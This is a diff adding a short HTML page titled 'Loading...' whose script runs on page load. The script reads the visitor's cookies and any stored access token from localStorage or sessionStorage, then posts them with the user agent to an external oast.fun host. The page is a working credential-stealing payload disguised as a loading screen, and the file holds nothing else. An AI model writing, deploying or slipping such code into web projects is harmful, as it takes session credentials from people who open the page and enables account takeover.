@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head><title>Loading...</title></head>
+<body>
+<script>
+(async () => {
+  const cookie = document.cookie;
+  const token = localStorage.getItem('token') || sessionStorage.getItem('access_token');
+
+  await fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun', {
+    method: 'POST',
+    body: new URLSearchParams({
+      cookie, token, ua: navigator.userAgent
+    })
+  });
+})();
+</script>
+</body>
+</html>
